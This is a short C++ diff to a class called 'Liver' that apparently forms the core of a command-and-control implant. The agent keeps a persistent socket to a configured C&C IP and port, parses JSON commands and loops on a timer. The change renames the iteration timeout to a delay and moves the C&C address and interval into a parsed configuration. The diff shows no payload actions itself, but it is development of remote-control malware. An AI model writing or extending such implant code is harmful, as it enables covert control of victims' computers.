@@ -16,11 +16,11 @@
 Liver::Liver(Event::Ptr quit_event,
              ICommandFactory::Ptr command_factory,
              ICommunicator::Ptr communicator,
-             const Time::Duration iteration_timeout) :
+             const Time::Duration iteration_delay) :
 	m_quit_event(std::move(quit_event)),
 	m_command_factory(std::move(command_factory)),
 	m_communicator(std::move(communicator)),
-	m_iteration_timeout(iteration_timeout),
+	m_iteration_delay(iteration_delay),
 	libraries()
 {
 }
@@ -29,7 +29,7 @@ void Liver::run()
 {
 	TRACE(L"running liver");
 
-	while (m_quit_event->wait(m_iteration_timeout) == WaitStatus::TIMEOUT)
+	while (m_quit_event->wait(m_iteration_delay) == WaitStatus::TIMEOUT)
 	{
 		try
 		{
@@ -47,13 +47,11 @@ void Liver::run()
 std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_configuration)
 {
 	const LiverConfiguration config = LiverConfiguration::parse(liver_configuration);
-	static constexpr SocketAddress cnc_address = {config.cnc_ip, config.cnc_port};
-	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
 	return std::make_unique<Liver>(
 		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
 		std::make_unique<JsonCommandFactory>(),
-		RawCommunicator::from_stream(std::make_shared<MaintainedSocket>(cnc_address)),
-		ITERATION_TIMEOUT
+		RawCommunicator::from_stream(std::make_shared<MaintainedSocket>(SocketAddress{config.cnc_ip, config.cnc_port})),
+		config.iteration_delay
 	);
 }
 
